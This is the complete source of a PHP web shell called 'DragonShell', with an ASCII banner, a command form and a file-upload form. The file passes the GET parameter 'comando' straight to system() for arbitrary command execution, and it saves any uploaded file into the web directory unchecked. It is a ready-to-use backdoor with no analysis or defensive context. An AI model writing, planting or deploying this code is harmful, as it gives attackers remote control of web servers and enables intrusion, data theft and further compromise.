<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style type="text/css">
body {
  color: red;
  background-color: black;
  font-family: "Courier New", Courier, monospace;
}
p {
  color: red;
}
		
</style>
</head>
<body>

<p align="center"><strong>
<textarea align="center" id="logo" name="logo" rows="7" cols="67" style="background-color:black;color:red">
 ____  ____      _    ____  ___  _   _ ____  _   _ _____ _     _
|  _ \|  _ \    / \  / ___|/ _ \| \ | / ___|| | | | ____| |   | |
| | | | |_) |  / _ \| |  _| | | |  \| \___ \| |_| |  _| | |   | |
| |_| |  _ <  / ___ \ |_| | |_| | |\  |___) |  _  | |___| |___| |___
|____/|_| \_\/_/   \_\____|\___/|_| \_|____/|_| |_|_____|_____|_____|

</textarea></strong>
</p>


<div align="center">
<form method="GET" action="dragonshell.php" align="center">
<input type="text" name="comando">
<input type="submit" value="X"></form>

<br>


<form action="dragonshell.php" method="post" enctype="multipart/form-data" align="center">
<input type="file" name="subir_archivo" id="subir_archivo"></input>
<input type="submit" value="X"></input></form>

</div>

<hr>

<?php 
//if (isset($_POST['submit'])) { 
$directorio = '';
$subir_archivo = $directorio.basename($_FILES['subir_archivo']['name']);
echo "<div>";
if (move_uploaded_file($_FILES['subir_archivo']['tmp_name'], $subir_archivo)) {
      echo "El archivo es válido y se cargó correctamente.<br><br>";
    echo"<a href='".$subir_archivo."' target='_blank'><img src='".$subir_archivo."' width='150'></a>";
    } else {
       echo "La subida ha fallado";
    }
    echo "</div>";
	//}
	
?>

<hr>

<?php
if(isset($_GET['comando']));
{
$adm = @system($_GET['comando']);
echo <<< EOT
<div><font color="red">
<b> $adm </b>
<hr>
</font></div>
EOT;
}
?>

</body>
<footer>
<p>Power by jhdbw</p>
</footer>
</html>